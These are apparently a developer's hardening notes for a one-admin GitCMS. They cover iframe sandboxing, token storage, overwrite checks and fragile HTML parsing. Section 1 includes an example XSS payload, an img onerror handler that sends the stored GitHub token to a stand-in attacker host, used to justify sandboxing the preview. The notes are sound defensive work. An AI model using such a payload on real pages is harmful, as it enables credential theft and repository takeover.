# GitCMS Hardening Notes

These notes are based on the current one-person GitCMS admin workflow.

The CMS is assumed to be operated by one trusted admin, so some multi-user and conflict scenarios are intentionally treated as low priority during development.

---

## Current Assumptions

- This is a **one-man CMS**.
- The admin file runs from a Git repo and writes through the GitHub API.
- HTML fragments may be edited from the same repo or another configured content repo.
- The GitHub token is used locally by the browser.
- The site will **not** be administered by two people at the same time.
- During development, keeping the token in browser storage is acceptable, but this should be revisited before production use.

---

## 1. Preview iframe security

### Status

Still worth fixing.

Even in a one-person CMS, the preview iframe can become dangerous if pasted/imported HTML contains JavaScript. The risk is lower because the admin is trusted, but malicious or accidental HTML could still access the parent page and exfiltrate the GitHub token.

Example risk:

```html
<img src=x onerror="fetch('https://attacker.example/?t=' + parent.localStorage.getItem('gitcms_tok'))">
```

### Fix

Sandbox the preview iframe.

Current iframe:

```html
<iframe id="preview"></iframe>
```

Change to:

```html
<iframe id="preview" sandbox></iframe>
```

Then update preview rendering to use `srcdoc` instead of writing directly into the iframe document:

```js
function updatePreview(f){
  el('preview').srcdoc = `<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body {
      font-family: system-ui, sans-serif;
      margin: 18px;
      color: #1a1a1a;
    }
  </style>
</head>
<body>${rebuildFragment(f)}</body>
</html>`;
}
```

### Important

Do **not** add these unless absolutely needed:

```html
allow-scripts
allow-same-origin
```

Adding both would mostly defeat the protection.

### Priority

High value, low effort. Do this early.

---

## 2. Stale overwrite risk

### Status

Low priority for this project.

Because this is a one-person CMS and the site will not be edited by two admins at the same time, stale overwrite risk is acceptable for now.

It only becomes relevant if files are edited from:

- another browser tab
- GitHub web editor
- VS Code
- another machine
- automation/bots
- another admin

### Optional later guard

If wanted later, add a simple SHA check before writing:

```js
const cur = await gh(
  `/repos/${state.owner}/${state.repo}/contents/${f.path}?ref=${state.workBranch}`
);

if (fileRec.shaDraft && cur.sha !== fileRec.shaDraft) {
  throw new Error('This file changed on draft since loading. Refresh before saving.');
}
```

### Priority

Low for the current one-person workflow.

---

## 3. Token storage

### Status

Leave as-is during development.

Current approach:

- token stored in `localStorage`
- token is base64-obfuscated, not encrypted
- acceptable while developing locally / personally
- should be marked as a future hardening task

### TODO marker

Add a clear code comment near the localStorage token logic:

```js
// TODO SECURITY:
// During development, the GitHub token is stored in localStorage for convenience.
// Before production/public use, replace this with sessionStorage, OAuth/device flow,
// or another safer auth model. Base64 is obfuscation only, not encryption.
```

### Possible future options

#### Option A: sessionStorage

Safer than localStorage because the token disappears when the browser session ends.

```js
sessionStorage.setItem(LS_TOKEN, enc(tok));
```

#### Option B: do not persist token

Require the token to be pasted each time.

#### Option C: OAuth/device flow

Best long-term UX/security choice, but more complex and usually requires an app registration or backend/helper flow.

### Priority

Medium later. Not urgent during development.

---

## 4. Multi-admin editing / locking

### Status

Not needed.

The CMS is intentionally designed for one admin. No collaborative locking, live presence, edit reservations, or complex merge UI is required.

### Recommendation

Do not build multi-user locking now. It adds complexity without solving a real current problem.

### Optional lightweight note

A future warning could be shown if a save conflict is detected, but this is optional.

### Priority

Skip for now.

---

## 5. Fragile HTML parsing and wrapper attribute loss

### Status

This is the main correctness issue to fix after iframe sandboxing.

Current parsing relies on a regex like:

```js
const SECTION_RE = /<section\s([^>]*)>([\s\S]*?)<\/section>/gi;
```

This is fragile with:

- nested `<section>` elements
- `>` inside attributes
- duplicate IDs
- unusual but valid HTML
- extra wrapper attributes

Current rebuild logic also loses wrapper attributes:

```js
function rebuildFragment(f){
  return `<section id="${f.id}" class="${f.classes}">${f.innerHTML}</section>`;
}
```

This means an original fragment like:

```html
<section id="hero" class="fragment hero" data-theme="dark" aria-label="Hero">
```

can become:

```html
<section id="hero" class="fragment hero">
```

The `data-theme` and `aria-label` attributes are lost.

---

## Recommended fix direction

### Preferred simple approach: preserve the original opening tag

When parsing a fragment, store:

- `openTag`
- `closeTag`
- `innerHTML`
- `id`
- `classes`
- `path`

Example fragment object:

```js
const f = {
  id,
  classes: attrGet(attrs, 'class'),
  label,
  path: fileRec.path,
  file: fileRec.path.split('/').pop(),
  openTag: wholeOpeningTag,
  closeTag: '</section>',
  innerHTML: inner,
  origHTML: inner,
  dirty: false
};
```

Then rebuild like this:

```js
function rebuildFragment(f){
  return `${f.openTag}${f.innerHTML}${f.closeTag}`;
}
```

This preserves extra attributes.

### Better long-term approach: use explicit CMS markers

Instead of parsing arbitrary `<section>` elements, use comments:

```html
<!-- cms:start hero -->
<section id="hero" class="fragment hero" data-theme="dark">
  ...
</section>
<!-- cms:end hero -->
```

Then replace only the content inside the marker block.

This is easier to parse safely:

```js
function fragmentMarkerRe(id){
  const safeId = id.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

  return new RegExp(
    `<!--\\s*cms:start\\s+${safeId}\\s*-->[\\s\\S]*?<!--\\s*cms:end\\s+${safeId}\\s*-->`,
    'i'
  );
}
```

Replacement example:

```js
function replaceMarkedFragment(content, frag){
  const re = fragmentMarkerRe(frag.id);

  const block = `<!-- cms:start ${frag.id} -->
${frag.html}
<!-- cms:end ${frag.id} -->`;

  if (!re.test(content)) {
    throw new Error(`Fragment marker not found: ${frag.id}`);
  }

  return content.replace(re, block);
}
```

### Important behavior change

Do not silently skip failed replacements.

Current behavior returns unchanged content if the fragment cannot be located. That can make the UI say the commit succeeded even though nothing changed.

Change this behavior:

```js
function replaceFragment(content, frag){
  let matched = false;

  const out = content.replace(SECTION_RE, (whole, attrs, inner) => {
    if (matched) return whole;

    if (attrGet(attrs, 'id') === frag.id && classHasFragment(attrs)) {
      matched = true;
      return rebuildFragment(frag);
    }

    return whole;
  });

  if (!matched) {
    throw new Error(`Fragment not found in file: ${frag.id}`);
  }

  return out;
}
```

### Priority

High after iframe sandboxing.

---

## Practical Fix Order

1. Sandbox the preview iframe.
2. Add the token-storage TODO marker.
3. Make `replaceFragment()` throw if replacement fails.
4. Preserve wrapper attributes when rebuilding fragments.
5. Later, consider switching from section-regex parsing to explicit CMS markers.
6. Optionally add stale-save SHA guard if editing from multiple places becomes common.

---

## Current Decision Summary

| Topic | Decision |
|---|---|
| Preview iframe security | Fix soon |
| Stale overwrite risk | Low priority |
| Token storage | Keep during development, mark TODO |
| Multi-admin editing | Not needed |
| HTML parsing / wrapper loss | Fix after iframe sandboxing |
